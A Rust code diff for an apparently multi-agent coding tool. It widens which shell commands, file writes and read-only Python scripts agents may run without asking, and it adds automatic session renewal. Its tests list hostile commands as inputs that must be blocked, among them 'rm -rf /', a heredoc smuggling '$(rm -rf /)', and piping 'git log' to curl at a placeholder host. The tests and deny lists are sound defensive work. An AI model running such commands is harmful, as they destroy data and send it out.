@@ -59,6 +59,10 @@ pub struct Agent {
     /// off because of that, so the next clock-in brings it back the way it was (see `restore_plan`)
     #[serde(default)]
     pub resume_as: Option<String>,
+    /// how big its conversation is now (tokens in the last request); a huge one is replaced by a fresh
+    /// session with a hand-over instead of being carried along every turn
+    #[serde(default)]
+    pub context: u64,
     #[serde(skip)]
     ready: bool,
     #[serde(skip)]
@@ -209,7 +213,8 @@ const TMP_ROOTS: [&str; 2] = ["/tmp", "/private/tmp"];
 /// Read, Glob, Grep…: every path they touch is inside the member's folder, the project or /tmp, and
 /// none of them looks like a key, token or .env (`needs_user`).
 fn read_tool_ok(tool: &str, input: &Value, workspace: &str, project: &str) -> bool {
-    let roots = [workspace, project, TMP_ROOTS[0], TMP_ROOTS[1]];
+    let records = std::env::var("HOME").map(|h| format!("{h}/.claude/projects")).unwrap_or_default(); // past conversations
+    let roots = [workspace, project, TMP_ROOTS[0], TMP_ROOTS[1], records.as_str()];
     let get = |k: &str| input.get(k).and_then(Value::as_str);
     let mut paths: Vec<String> = ["file_path", "notebook_path", "path"].iter().filter_map(|k| get(k)).map(String::from).collect();
     // Glob's pattern may itself start from an absolute folder ("/etc/**")
@@ -276,16 +281,76 @@ fn is_safe_bash(detail: &str, workspace: &str, project: &str) -> bool {
     if needs_user("Bash", detail, workspace) {
         return false;
     }
-    match split_shell(detail) {
-        Some(parts) => !parts.is_empty() && parts.iter().all(|p| is_safe_simple(p, workspace, project)),
+    let Some((line, bodies)) = take_heredocs(detail) else { return false };
+    match split_shell(&line, workspace) {
+        Some(parts) => !parts.is_empty() && parts.iter().all(|p| is_safe_simple(p, workspace, project, &bodies)),
         None => false,
     }
 }
 
+/// Pulls `<<'TAG'` here-documents out of the line: their text is data for the command, not commands.
+/// Each is replaced by a `__HEREDOC_n__` word and returned in order. `None` = a form this check won't
+/// vouch for: no closing line, two on one line, `<<<`, or an unquoted tag whose text could expand (`$`, backtick).
+fn take_heredocs(line: &str) -> Option<(String, Vec<String>)> {
+    let lines: Vec<&str> = line.split('\n').collect();
+    let (mut out, mut bodies) = (Vec::new(), Vec::new());
+    let mut i = 0;
+    while i < lines.len() {
+        let l = lines[i];
+        i += 1;
+        let Some(at) = l.find("<<") else {
+            out.push(l.to_string());
+            continue;
+        };
+        let rest = &l[at + 2..];
+        if rest.starts_with('<') || l[..at].ends_with('<') {
+            return None;
+        }
+        let (dash, rest) = rest.strip_prefix('-').map_or((false, rest), |r| (true, r));
+        let rest = rest.trim_start();
+        let (quoted, tag, after) = match rest.chars().next() {
+            Some(q @ ('\'' | '"')) => {
+                let end = rest[1..].find(q)?;
+                (true, &rest[1..1 + end], &rest[2 + end..])
+            }
+            _ => {
+                let end = rest.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).unwrap_or(rest.len());
+                (false, &rest[..end], &rest[end..])
+            }
+        };
+        if tag.is_empty() || after.contains("<<") {
+            return None;
+        }
+        let mut body = Vec::new();
+        loop {
+            let b = *lines.get(i)?;
+            i += 1;
+            if (if dash { b.trim() } else { b }) == tag {
+                break;
+            }
+            body.push(b);
+        }
+        let body = body.join("\n");
+        if !quoted && (body.contains('$') || body.contains('`')) {
+            return None;
+        }
+        out.push(format!("{}__HEREDOC_{}__{}", &l[..at], bodies.len(), after));
+        bodies.push(body);
+    }
+    Some((out.join("\n"), bodies))
+}
+
+/// A path a command may write to: inside the member's folder or /tmp, and not where tools and keys live
+/// (`.git` hooks, `.claude`, `.prism`, `.ssh`…).
+fn write_path_ok(word: &str, workspace: &str) -> bool {
+    const PROTECTED: [&str; 7] = [".git", ".claude", ".prism", ".ssh", ".husky", ".gnupg", ".aws"];
+    shell_path_ok(word, workspace) && !word.split('/').any(|c| PROTECTED.contains(&c))
+}
+
 /// Splits a shell line into simple commands and drops the redirections it has checked.
 /// `None` = something this check won't vouch for: `$(…)`, backticks, subshells, `&`, or a redirection
-/// other than `2>&1`-style fd dups, `>/dev/null` and `>/tmp/…`.
-fn split_shell(line: &str) -> Option<Vec<String>> {
+/// other than `2>&1`-style fd dups, `>/dev/null`, and files inside the member's folder or /tmp.
+fn split_shell(line: &str, workspace: &str) -> Option<Vec<String>> {
     let chars: Vec<char> = line.chars().collect();
     let mut parts = Vec::new();
     let mut cur = String::new();
@@ -322,7 +387,7 @@ fn split_shell(line: &str) -> Option<Vec<String>> {
                     (!fd.is_empty() && fd.chars().all(|d| d.is_ascii_digit()), e)
                 } else {
                     let (path, e) = read_word(&chars, j);
-                    (path == "/dev/null" || (path.starts_with("/tmp/") && !path.contains("..")), e)
+                    (path == "/dev/null" || write_path_ok(&path, workspace), e)
                 };
                 if !ok {
                     return None;
@@ -358,14 +423,32 @@ fn has_flag(args: &[&str], flags: &[&str]) -> bool {
 }
 
 /// One simple command (no chaining left in it) on the safe list.
-fn is_safe_simple(part: &str, workspace: &str, project: &str) -> bool {
-    let words: Vec<&str> = part.split_whitespace().collect();
+fn is_safe_simple(part: &str, workspace: &str, project: &str, bodies: &[String]) -> bool {
+    // a here-document is only the command's input; its text is `bodies[n]`
+    let mut heredoc: Option<&str> = None;
+    let words: Vec<&str> = part
+        .split_whitespace()
+        .filter(|w| match w.strip_prefix("__HEREDOC_").and_then(|r| r.strip_suffix("__")).and_then(|n| n.parse::<usize>().ok()) {
+            Some(n) => {
+                heredoc = bodies.get(n).map(String::as_str);
+                false
+            }
+            None => true,
+        })
+        .collect();
     let Some((&first, args)) = words.split_first() else { return false };
     // the project's own tsc / vite (`node_modules/.bin/tsc`, `./node_modules/.bin/vite`, or by full path)
     let local = first.rsplit_once("node_modules/.bin/").map(|(_, b)| b).filter(|b| matches!(*b, "tsc" | "vite") && path_within(first, workspace, &[workspace, project]));
     let cmd = local.unwrap_or(first);
     match cmd {
-        "ls" | "pwd" | "cat" | "head" | "tail" | "wc" | "grep" | "echo" | "which" | "cut" | "tr" => true,
+        "ls" | "pwd" | "cat" | "head" | "tail" | "wc" | "grep" | "echo" | "which" | "cut" | "tr" | "printf" | "diff" | "stat" | "file" | "du" | "basename" | "dirname"
+        | "realpath" | "nl" | "rev" | "fold" | "paste" | "comm" | "column" | "shasum" | "md5" | "true" | "false" => true,
+        "jq" => !args.iter().any(|a| a.contains("ENV") || a.contains("env")),
+        "tree" => !args.iter().any(|a| a.starts_with("-o")),
+        "touch" => !args.is_empty() && args.iter().all(|a| !a.starts_with('-') && write_path_ok(a, workspace)),
+        "tee" => args.iter().filter(|a| **a != "-a").all(|a| !a.starts_with('-') && write_path_ok(a, workspace)),
+        "sips" => is_safe_sips(args, workspace),
+        "python3" | "python" => is_read_only_python(args, heredoc, workspace),
         "rg" => !has_flag(args, &["--pre"]),
         "find" => !args.iter().any(|a| matches!(*a, "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir" | "-fls" | "-fprint" | "-fprint0" | "-fprintf")),
         "sed" => is_read_only_sed(args),
@@ -383,7 +466,7 @@ fn is_safe_simple(part: &str, workspace: &str, project: &str) -> bool {
             Some(&"exec") => args.get(1) == Some(&"tsc") && args.contains(&"--noEmit"),
             _ => false,
         },
-        "mkdir" => !args.is_empty() && args.iter().all(|a| *a == "-p" || (!a.starts_with('-') && shell_path_ok(a, workspace))) && args.contains(&"-p"),
+        "mkdir" => !args.is_empty() && args.iter().all(|a| *a == "-p" || (!a.starts_with('-') && write_path_ok(a, workspace))) && args.contains(&"-p"),
         "cp" => file_move_ok(args, "rRapfnvHLP", workspace),
         "mv" => file_move_ok(args, "fnv", workspace),
         "cd" => is_inside(args, workspace),
@@ -396,7 +479,98 @@ fn file_move_ok(args: &[&str], allowed: &str, workspace: &str) -> bool {
     let (flags, paths): (Vec<&str>, Vec<&str>) = args.iter().partition(|a| a.starts_with('-'));
     flags.iter().all(|f| f.len() > 1 && !f.starts_with("--") && f[1..].chars().all(|c| allowed.contains(c)))
         && paths.len() >= 2
-        && paths.iter().all(|p| shell_path_ok(p, workspace))
+        && paths.iter().all(|p| write_path_ok(p, workspace))
+}
+
+/// `sips` reading (`-g`), or converting into /tmp (`--out`): never rewriting a picture in place.
+fn is_safe_sips(args: &[&str], workspace: &str) -> bool {
+    let out = args.iter().position(|a| matches!(*a, "-o" | "--out")).and_then(|i| args.get(i + 1));
+    match out {
+        Some(o) => TMP_ROOTS.iter().any(|t| o.starts_with(&format!("{t}/"))) && path_within(o, workspace, &TMP_ROOTS),
+        None => args.iter().any(|a| matches!(*a, "-g" | "--getProperty")) && !args.iter().any(|a| matches!(*a, "-s" | "--setProperty" | "-z" | "-Z" | "-r" | "-f" | "-c" | "-p" | "-i" | "-m")),
+    }
+}
+
+/// `python3 -I` running a script that only reads: the script comes from a here-document (`python3 -I - <<'EOF'`)
+/// or a file in the member's folder. `-c` is left out (quoting can't be vouched for here).
+fn is_read_only_python(args: &[&str], heredoc: Option<&str>, workspace: &str) -> bool {
+    if !args.contains(&"-I") || !args.iter().all(|a| matches!(*a, "-I" | "-B" | "-u" | "-") || !a.starts_with('-')) {
+        return false;
+    }
+    let files: Vec<&&str> = args.iter().filter(|a| !a.starts_with('-')).collect();
+    match (files.as_slice(), heredoc) {
+        ([], Some(code)) => python_reads_only(code),
+        ([f], None) if f.ends_with(".py") && shell_path_ok(f, workspace) => {
+            let full = std::path::Path::new(workspace).join(f);
+            let size_ok = std::fs::metadata(&full).is_ok_and(|m| m.len() <= 100_000);
+            size_ok && std::fs::read_to_string(&full).is_ok_and(|c| !needs_user("Bash", &c, workspace) && python_reads_only(&c))
+        }
+        _ => false,
+    }
+}
+
+/// Python source that only reads and prints: a short list of harmless modules, no writing, deleting,
+/// running programs, network, or reflection. Deliberately narrow — anything unusual asks.
+fn python_reads_only(code: &str) -> bool {
+    const MODULES: &[&str] = &[
+        "json", "re", "sys", "collections", "itertools", "math", "datetime", "time", "statistics", "csv", "glob", "pathlib", "textwrap", "string", "functools", "typing",
+        "argparse", "hashlib", "base64", "io", "unicodedata", "fnmatch", "os", "heapq", "operator", "dataclasses", "enum", "decimal", "fractions", "difflib", "pprint",
+        "struct", "random", "PIL",
+    ];
+    const DENIED: &[&str] = &[
+        "__", "exec", "eval", "compile(", "subprocess", "system", "popen", "spawn", "fork", "socket", "urllib", "http", "request", "ftp", "smtp", "telnet", "ssl", "shutil",
+        "tempfile", "ctypes", "pickle", "marshal", "importlib", "builtins", "getattr", "setattr", "delattr", "globals", "locals", "vars(", "write", "unlink", "remove", "rmdir",
+        "rmtree", "rename", "mkdir", "makedirs", "chmod", "chown", "symlink", "link(", "truncate", "touch", "dump(", "save(", "file=", "environ", "getenv", "input(",
+        "breakpoint", "signal", "kill", "thread", "multiprocessing", "asyncio", "webbrowser", "copy", "sendfile", "zipfile", "tarfile",
+    ];
+    if code.trim().is_empty() || DENIED.iter().any(|d| code.contains(d)) {
+        return false;
+    }
+    // `Path.replace(target)` renames a file; `str.replace` is fine but looks the same, so with pathlib around it asks
+    if code.contains(".replace(") && (code.contains("pathlib") || code.contains("Path")) {
+        return false;
+    }
+    // imports: only the listed modules, only as statements of their own
+    for stmt in code.split(['\n', ';']) {
+        let t = stmt.trim();
+        let mut hit = false;
+        for (at, _) in t.match_indices("import") {
+            let word = (at == 0 || !t[..at].ends_with(|c: char| c.is_alphanumeric() || c == '_')) && !t[at + 6..].starts_with(|c: char| c.is_alphanumeric() || c == '_');
+            hit |= word;
+        }
+        if !hit {
+            continue;
+        }
+        let names: Vec<&str> = if let Some(r) = t.strip_prefix("import ") {
+            r.split(',').map(|n| n.split_whitespace().next().unwrap_or("")).collect()
+        } else if let Some(r) = t.strip_prefix("from ").and_then(|r| r.split_once(" import ")).map(|(m, _)| m) {
+            vec![r.trim()]
+        } else {
+            return false;
+        };
+        if names.iter().any(|n| !MODULES.contains(&n.split('.').next().unwrap_or(""))) {
+            return false;
+        }
+    }
+    // `os` only for looking: os.path, listdir, walk…
+    for (at, _) in code.match_indices("os.") {
+        if code[..at].ends_with(|c: char| c.is_alphanumeric() || c == '_' || c == '.') {
+            continue; // `pos.`, `x.os.`
+        }
+        let name: String = code[at + 3..].chars().take_while(|c| c.is_alphanumeric() || *c == '_').collect();
+        if !["path", "listdir", "walk", "getcwd", "scandir", "stat", "sep", "linesep"].contains(&name.as_str()) {
+            return false;
+        }
+    }
+    // open(...) only for reading
+    for (at, _) in code.match_indices("open(") {
+        let call: &str = code[at..].split(')').next().unwrap_or("");
+        let modes: Vec<&str> = call.split(['\'', '"']).skip(1).step_by(2).collect();
+        if call.contains("mode") || modes.iter().any(|m| !m.is_empty() && m.chars().all(|c| "rwaxbt+U".contains(c)) && m.contains(['w', 'a', 'x', '+'])) {
+            return false;
+        }
+    }
+    true
 }
 
 /// `cargo build|test|check|clippy` and `cargo fmt --check`; nothing that moves output elsewhere,
@@ -480,7 +654,7 @@ fn is_read_only_git(args: &[&str]) -> bool {
         return false;
     }
     match sub {
-        "status" | "diff" | "log" | "show" | "rev-parse" => true,
+        "status" | "diff" | "log" | "show" | "rev-parse" | "blame" | "ls-files" | "ls-tree" | "shortlog" | "describe" | "show-ref" | "cat-file" | "diff-tree" | "name-rev" => true,
         "branch" => rest.iter().all(|a| matches!(*a, "-a" | "-r" | "-v" | "-vv" | "-l" | "--all" | "--remotes" | "--list" | "--verbose" | "--show-current")),
         _ => false,
     }
@@ -604,9 +778,6 @@ mod auto_allow_tests {
             // the old rules
             "rm -rf target",
             "ls && rm notes.txt",
-            "echo hi > notes.txt",
-            "echo hi >> notes.txt",
-            "ls 1>out.txt",
             "sed -i 's/a/b/' src/team.rs",
             "sed -n '1p;w out.txt' src/team.rs",
             "sed -n 's/a/b/e' src/team.rs",
@@ -715,6 +886,159 @@ mod auto_allow_tests {
             assert!(!bash_ok(cmd), "should ask: {cmd}");
         }
         assert!(!bash_ok(outside_bin));
+    }
+
+    #[test]
+    fn wider_read_write_and_script_cases_pass() {
+        let home = std::env::var("HOME").unwrap_or_default();
+        let records = format!("ls {home}/.claude/projects/-Users-x-orca | head -5");
+        let records2 = format!("grep -l permission {home}/.claude/projects/-Users-x-orca/a.jsonl | wc -l");
+        for cmd in [
+            records.as_str(),
+            records2.as_str(),
+            "ls -t ~/.claude/projects/-Users-x-orca/*.jsonl | head -3",
+            "find . -name '*.rs' | sort | uniq | head",
+            "git log --oneline -20 | awk '{print $1}' | sort | uniq -c",
+            "git show HEAD --stat",
+            "git blame src/team.rs | head",
+            "git ls-files | wc -l",
+            "cat notes.txt | tr a-z A-Z | cut -c1-20",
+            "diff a.txt b.txt",
+            "stat -f %z notes.txt",
+            "du -sh src",
+            "jq '.name' package.json",
+            "basename notes.txt .txt",
+            "printf hi",
+            // writing inside the folder
+            "echo hi > notes.txt",
+            "echo hi >> notes.txt",
+            "ls 1>out.txt",
+            "cargo test 2>&1 | tee out/test.log",
+            "touch out.txt",
+            "cat > notes.md <<'EOF'\n# 제목\n본문 한 줄\n\nEOF",
+            "cat > src/new.rs <<'EOF'\nfn main() { println!(\"hi\"); }\nEOF",
+            "cat >> notes.md <<EOF\nplain text, no expansion\nEOF",
+            "mkdir -p out && cat > out/a.json <<'EOF'\n{\"a\": 1}\nEOF",
+            "git add . && git commit -m wip",
+            // python that only reads
+            "python3 -I - <<'EOF'\nimport json\nd = json.load(open('package.json'))\nprint(d['name'])\nEOF",
+            "python3 -I <<'EOF'\nimport glob, os\nfor f in sorted(glob.glob('src/*.rs')):\n    print(f, os.path.getsize(f))\nEOF",
+            "python3 -I - <<'EOF' | head -20\nimport re, sys\nfor line in open('notes.txt', 'r'):\n    if re.search('todo', line): print(line.strip())\nEOF",
+            // pictures to /tmp
+            "sips -Z 800 shot.png --out /tmp/shot-small.png",
+            "sips -s format png shot.heic --out /tmp/prism-shot.png",
+            "sips -g pixelWidth -g pixelHeight shot.png",
+        ] {
+            assert!(bash_ok(cmd), "should pass: {cmd}");
+        }
+        // a script file in the folder that only reads
+        let (_, ws) = dirs();
+        std::fs::write(format!("{ws}/ok_read.py"), "import json\nprint(json.dumps({'a': 1}))\n").unwrap();
+        std::fs::write(format!("{ws}/bad_write.py"), "open('x.txt', 'w').write('hi')\n").unwrap();
+        assert!(bash_ok("python3 -I ok_read.py"));
+        assert!(!bash_ok("python3 -I bad_write.py"));
+        assert!(!bash_ok("python3 -I missing.py"));
+    }
+
+    #[test]
+    fn deletes_network_and_outside_writes_still_ask() {
+        for cmd in [
+            // writing outside the folder or into tool/key folders
+            "echo hi > /etc/hosts",
+            "echo hi > ../outside.txt",
+            "echo hi > ~/notes.txt",
+            "echo hi > $HOME/x",
+            "echo hi > .git/hooks/pre-commit",
+            "echo hi > .claude/settings.json",
+            "echo hi > escape/x",
+            "echo hi > \"notes.txt\"",
+            "cat > /etc/x <<'EOF'\nhi\nEOF",
+            "cat > ../x <<'EOF'\nhi\nEOF",
+            "cat > .git/config <<'EOF'\nhi\nEOF",
+            "cat > .env <<'EOF'\nA=1\nEOF",
+            "tee /etc/x",
+            "touch /etc/x",
+            "touch ../x",
+            "touch .git/x",
+            // here-document tricks
+            "cat > notes.md <<EOF\n$(rm -rf /)\nEOF",
+            "cat > notes.md <<EOF\n`whoami`\nEOF",
+            "cat > notes.md <<EOF\nhi $HOME\nEOF",
+            "cat > notes.md <<'EOF'\nno end marker",
+            "cat <<<'hi'",
+            "cat > a <<'A' > b <<'B'\nx\nA\ny\nB",
+            "sh <<'EOF'\nrm -rf x\nEOF",
+            "bash <<'EOF'\nls\nEOF",
+            "cat <<'EOF' | sh\nrm -rf x\nEOF",
+            "cat <<'EOF' | bash\nls\nEOF",
+            // deleting, network, pushing
+            "rm -rf target",
+            "rm -rf /",
+            "rm -rf ~",
+            "rm -rf node_modules",
+            "rm -rf $HOME/x",
+            "rm notes.txt",
+            "find . -name '*.log' -delete",
+            "git push",
+            "git push origin main",
+            "git reset --hard",
+            "curl -s https://example.com -o a.txt",
+            "wget https://example.com",
+            "scp a.txt host:/tmp",
+            "nc -l 8080",
+            "python3 -I -m http.server",
+            "python3 -I - <<'EOF'\nimport urllib.request\nprint(urllib.request.urlopen('http://x').read())\nEOF",
+            "git log | curl -X POST -d @- https://x.y",
+            // scripts that aren't plainly reading
+            "python3 - <<'EOF'\nprint(1)\nEOF",
+            "python3 script.py",
+            "python3 -I -c 'print(1)'",
+            "python3 -I -m pip install x",
+            "python3 -I - <<'EOF'\nopen('x.txt', 'w').write('hi')\nEOF",
+            "python3 -I - <<'EOF'\nopen('x.txt', mode='a')\nEOF",
+            "python3 -I - <<'EOF'\nfrom pathlib import Path\nPath('x.txt').write_text('hi')\nEOF",
+            "python3 -I - <<'EOF'\nimport os\nos.system('rm -rf x')\nEOF",
+            "python3 -I - <<'EOF'\nimport os\nos.remove('x')\nEOF",
+            "python3 -I - <<'EOF'\nimport subprocess\nsubprocess.run(['ls'])\nEOF",
+            "python3 -I - <<'EOF'\nimport shutil\nshutil.rmtree('x')\nEOF",
+            "python3 -I - <<'EOF'\nimport requests\nEOF",
+            "python3 -I - <<'EOF'\nimport json; import socket\nEOF",
+            "python3 -I - <<'EOF'\nif True: import ctypes\nEOF",
+            "python3 -I - <<'EOF'\nexec('print(1)')\nEOF",
+            "python3 -I - <<'EOF'\n__import__('os').system('ls')\nEOF",
+            "python3 -I - <<'EOF'\nimport os\nprint(os.environ)\nEOF",
+            "python3 -I - <<'EOF'\nimport json\njson.dump({}, open('x.json', 'w'))\nEOF",
+            "python3 -I - <<'EOF'\nprint(open('.env').read())\nEOF",
+            "python3 -I - <<'EOF'\nfrom pathlib import Path\nPath('a').replace('/etc/b')\nEOF",
+            "python3 -I - <<'EOF'\nEOF",
+            // pictures: only into /tmp, never in place
+            "sips -Z 800 shot.png",
+            "sips -Z 800 shot.png --out notes/shot.png",
+            "sips -Z 800 shot.png --out /etc/shot.png",
+            "sips -Z 800 shot.png --out /tmp/../etc/shot.png",
+            "sips -s format png shot.heic",
+            // lookalikes of the safe tools
+            "jq 'env' package.json",
+            "tree -o out.txt",
+            "tee -a /etc/x",
+            "git add . && git push",
+            "git commit -m wip && git push origin main",
+        ] {
+            assert!(!bash_ok(cmd), "should ask: {cmd}");
+        }
+    }
+
+    #[test]
+    fn reading_claude_session_records_is_allowed() {
+        let home = std::env::var("HOME").unwrap_or_default();
+        if home.is_empty() || !std::path::Path::new(&format!("{home}/.claude/projects")).is_dir() {
+            return;
+        }
+        assert!(tool_ok("Read", json!({ "file_path": format!("{home}/.claude/projects/-Users-x-orca/abc.jsonl") })));
+        assert!(tool_ok("Grep", json!({ "pattern": "error", "path": format!("{home}/.claude/projects") })));
+        assert!(!tool_ok("Read", json!({ "file_path": format!("{home}/.claude/settings.json") })));
+        assert!(!tool_ok("Read", json!({ "file_path": format!("{home}/.claude/.credentials.json") })));
+        assert!(!tool_ok("Read", json!({ "file_path": format!("{home}/.ssh/config") })));
     }
 
     #[test]
@@ -1036,21 +1360,46 @@ fn free_worker_name(team: &Team) -> String {
     (1..).map(|n| format!("W{n}")).find(|s| !busy.contains(s.as_str())).unwrap_or_default()
 }
 
+/// One card as a line.
+fn task_line(team: &Team, t: &Task) -> String {
+    let who = t.assignee.as_deref().map(|a| team.name_of(a)).unwrap_or_else(|| "-".into());
+    format!("{} [{}] {} · 담당 {} · 요청 {}{}", t.id, t.stage, t.title, who, team.name_of(&t.requested_by), t.summary.as_ref().map(|s| format!(" · {}", short(s, 60))).unwrap_or_default())
+}
+
 /// The cards, one line each (what `list_tasks` answers).
 fn task_lines(team: &Team) -> String {
-    let lines: Vec<String> = team
-        .tasks
-        .iter()
-        .map(|t| {
-            let who = t.assignee.as_deref().map(|a| team.name_of(a)).unwrap_or_else(|| "-".into());
-            format!("{} [{}] {} · 담당 {} · 요청 {}{}", t.id, t.stage, t.title, who, team.name_of(&t.requested_by), t.summary.as_ref().map(|s| format!(" · {}", short(s, 60))).unwrap_or_default())
-        })
-        .collect();
+    let lines: Vec<String> = team.tasks.iter().map(|t| task_line(team, t)).collect();
     if lines.is_empty() { "작업 카드가 없어요.".into() } else { lines.join("\n") }
+}
+
+/// How many finished cards a new conversation's first message lists; the rest are only counted.
+const HANDOVER_RECENT: usize = 5;
+
+/// For a new 총괄 conversation: every unfinished card (queued, running, waiting for review), the last few
+/// finished ones, and only the number of the rest — the full list is a `list_tasks` away.
+fn handoff_task_lines(team: &Team) -> String {
+    let open = |t: &&Task| !matches!(t.stage.as_str(), "done" | "failed");
+    let mut closed: Vec<&Task> = team.tasks.iter().filter(|t| !open(t)).collect();
+    closed.sort_by_key(|t| std::cmp::Reverse(t.updated_at));
+    let skipped = closed.len().saturating_sub(HANDOVER_RECENT);
+    closed.truncate(HANDOVER_RECENT);
+    let mut lines: Vec<String> = team.tasks.iter().filter(open).map(|t| task_line(team, t)).collect();
+    lines.extend(closed.into_iter().map(|t| task_line(team, t)));
+    if lines.is_empty() {
+        return "작업 카드가 없어요.".into();
+    }
+    if skipped > 0 {
+        lines.push(format!("(이 밖에 끝난 카드 {skipped}장 — 필요하면 list_tasks)"));
+    }
+    lines.join("\n")
 }
 
 /// How long the 총괄 gets to write its hand-over memo before the new conversation starts without it.
 const RENEW_WAIT: std::time::Duration = std::time::Duration::from_secs(120);
+/// The 총괄's conversation (tokens) past which it starts a new one by itself after a turn.
+const RENEW_CONTEXT: u64 = 170_000;
+/// A worker's earlier conversation this big isn't continued for a follow-up: it starts fresh with a summary.
+const FRESH_CONTEXT: u64 = 150_000;
 
 fn short(s: &str, n: usize) -> String {
     let s = s.trim();
@@ -1663,6 +2012,7 @@ impl TeamManager {
             last_active: now,
             stuck: None,
             resume_as: None,
+            context: 0,
             ready: true,
             pending: vec![],
             children: 0,
@@ -1798,6 +2148,9 @@ impl TeamManager {
             m.structured = true;
             m.ready = true;
             m.stuck = None;
+            if resume.is_none() {
+                m.context = 0;
+            }
             // a member coming back (resumed, or restarted fresh because its old session was gone)
             // is at work again; brand-new members already got their status in spawn_agent
             if resume.is_some() || m.status == "off" {
@@ -1959,6 +2312,8 @@ impl TeamManager {
                     self.emit(team);
                     return;
                 }
+                // a conversation grown too big is carried along (and paid for) every turn: after this turn, hand over
+                let auto_renew = role == "lead" && !error && team.agent(aid).is_some_and(|a| a.context >= RENEW_CONTEXT);
                 let result = result.filter(|r| !r.trim().is_empty());
                 // a failed turn always says so, in plain words (even when the agent gave no reason)
                 let result = if error { Some(stopped_because(result.as_deref().unwrap_or("알 수 없는 오류"))) } else { result };
@@ -1972,6 +2327,9 @@ impl TeamManager {
                         let name = team.name_of(aid);
                         team.log(format!("{name}: {}", short(&text, 120)), Some("block"));
                     }
+                    if auto_renew {
+                        let _ = self.start_renew(team, true);
+                    }
                     drop(teams);
                     self.push_entry(pid, aid, if error { "error" } else { "done" }, short(&text, 300));
                     let mut teams = self.teams.lock().unwrap();
@@ -1980,6 +2338,15 @@ impl TeamManager {
                     }
                     return;
                 }
+                if auto_renew {
+                    let _ = self.start_renew(team, true);
+                }
+            }
+            Event::Context(n) => {
+                if let Some(a) = team.agent_mut(aid) {
+                    a.context = n;
+                }
+                return; // nothing to show: no need to wake the screen
             }
             Event::Exit(_) => {}
         }
@@ -2097,8 +2464,15 @@ impl TeamManager {
                     a.parent_id = Some("lead".into());
                 }
             }
-            let resume = (!agent.session_id.is_empty()).then(|| agent.session_id.clone());
-            if self.launch_agent(team, &aid, resume).is_err() {
+            // an earlier conversation this big costs more than it helps: start fresh, carrying only what the old card did
+            let resume = (!agent.session_id.is_empty() && agent.context < FRESH_CONTEXT).then(|| agent.session_id.clone());
+            if resume.is_none() && !agent.session_id.is_empty() {
+                let done = task.summary.clone().unwrap_or_else(|| short(&task.goal, 200));
+                if let Some(t) = team.task_mut(&fid) {
+                    t.goal = format!("{}\n\n[이어서 하는 일 — 이전 카드 {tid}: {}] {done}\n(이전 대화는 길어져서 새로 시작했어요. 이전 결과는 이 폴더의 코드와 git 기록에 있어요.)", t.goal, task.title);
+                }
+            }
+            if resume.is_none() || self.launch_agent(team, &aid, resume).is_err() {
                 self.launch_agent(team, &aid, None)?;
                 fresh = true; // a fresh start already got the card as its first message
             }
@@ -2141,6 +2515,13 @@ impl TeamManager {
     pub fn lead_renew(&self, pid: &str) -> Result<(), String> {
         let mut teams = self.teams.lock().unwrap();
         let team = teams.get_mut(pid).ok_or("팀이 출근하지 않았어요")?;
+        self.start_renew(team, false)
+    }
+
+    /// `auto`: the conversation grew too big and the 총괄 hands over by itself (the user is told in the chat).
+    fn start_renew(&self, team: &mut Team, auto: bool) -> Result<(), String> {
+        let pid = team.project.id.clone();
+        let pid = pid.as_str();
         if self.renewing.lock().unwrap().contains_key(pid) {
             return Ok(());
         }
@@ -2152,13 +2533,16 @@ impl TeamManager {
         if alive && lead.stuck.is_none() && matches!(lead.status.as_str(), "work" | "block") {
             return Err("총괄이 일하는 중이에요. 답이 끝난 뒤 다시 눌러주세요.".into());
         }
+        if auto {
+            team.say("lead", "대화가 길어져서 새 대화로 이어갈게요. 하던 일은 그대로예요.".into(), None);
+        }
         // nobody there to write a memo (lost session): start from the card list alone
         if !alive || lead.stuck.is_some() {
             self.finish_renew(team, None);
             self.emit(team);
             return Ok(());
         }
-        team.log("총괄 대화를 새로 시작한다: 인수인계 메모를 받는 중.", None);
+        team.log(if auto { "총괄 대화가 길어져 자동으로 새로 시작한다: 인수인계 메모를 받는 중." } else { "총괄 대화를 새로 시작한다: 인수인계 메모를 받는 중." }, None);
         let started = now_ms();
         self.renewing.lock().unwrap().insert(pid.to_string(), started);
         if !self.inject(team, "lead", prompts::handoff_request()) {
@@ -2201,7 +2585,7 @@ impl TeamManager {
             let _ = std::fs::create_dir_all(path.parent().unwrap());
             let _ = std::fs::write(path, m);
         }
-        let first = prompts::handoff_start(memo.as_deref(), &task_lines(team));
+        let first = prompts::handoff_start(memo.as_deref(), &handoff_task_lines(team));
         team.say("divider", "여기서부터 새 대화".into(), None);
         let key = format!("{pid}/lead");
         self.permission_turns.lock().unwrap().remove(&key);
@@ -2214,6 +2598,7 @@ impl TeamManager {
             a.thought = None;
             a.activity.clear();
             a.pending.clear();
+            a.context = 0;
         }
         match self.launch_agent(team, "lead", None) {
             Ok(()) => {
@@ -2411,12 +2796,7 @@ impl TeamManager {
                 self.inject(
                     team,
                     b,
-                    format!(
-                        "[Prism 허락 요청 #{id}] {name}이(가) 실행하려고 해요 — {tool}: {}\n\
-프로젝트 안의 평범한 개발 작업(설치·빌드·테스트·파일 작업)이면 decide_permission(request_id: {id}, decision: \"allow\"), \
-맡긴 일과 상관없거나 위험하면 \"deny\", 사용자 판단이 필요하면 \"ask_user\". 판단한 뒤 하던 일을 이어서 하세요.",
-                        short(&detail, 300)
-                    ),
+                    format!("[Prism 허락 요청 #{id}] {name}: {tool} {}\ndecide_permission(request_id: {id}, decision: allow|deny|ask_user)", short(&detail, 200)),
                 );
                 // a busy boss mustn't stall the team: hand it to the user after a while
                 let app = self.app.clone();
@@ -3583,6 +3963,7 @@ mod restart_tests {
             last_active: 0,
             stuck: None,
             resume_as: None,
+            context: 0,
             ready: true,
             pending: vec![],
             children: 0,
